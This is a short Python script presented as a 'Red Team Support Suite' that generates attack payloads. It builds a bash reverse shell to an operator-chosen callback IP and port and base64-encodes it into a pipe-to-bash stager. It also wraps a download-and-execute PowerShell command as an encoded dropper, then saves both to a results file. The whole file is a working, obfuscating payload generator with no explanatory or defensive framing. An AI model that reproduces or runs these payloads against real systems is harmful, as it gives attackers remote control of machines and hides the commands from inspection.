import base64
from datetime import datetime

results = []

def generate_shell_stager(ip, port):
    cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    b64_cmd = base64.b64encode(cmd.encode()).decode()
    return {
        "type": "bash reverse shell",
        "stager": f"echo {b64_cmd} | base64 -d | bash",
        "raw": cmd
    }

def generate_ps_encoded(cmd):
    encoded = base64.b64encode(cmd.encode("utf-16le")).decode()
    return {
        "type": "PowerShell dropper",
        "payload": f"powershell -EncodedCommand {encoded}",
        "original": cmd
    }

def run_red_team_tools():
    print("\n--- Red Team Support Suite ---")
    ip = input("Enter callback IP (e.g., 10.0.0.5): ").strip()
    port = input("Enter callback port (e.g., 9001): ").strip()
    ps_cmd = input("Enter PowerShell stager command (e.g., download + execute): ").strip()

    stager = generate_shell_stager(ip, port)
    powershell = generate_ps_encoded(ps_cmd)

    results.append({
        **stager,
        "timestamp": datetime.utcnow().isoformat()
    })
    results.append({
        **powershell,
        "timestamp": datetime.utcnow().isoformat()
    })

    with open("red_team_support_results.txt", "w") as f:
        for r in results:
            f.write(str(r) + "\n")

    print("\n[+] Payloads saved to red_team_support_results.txt.")

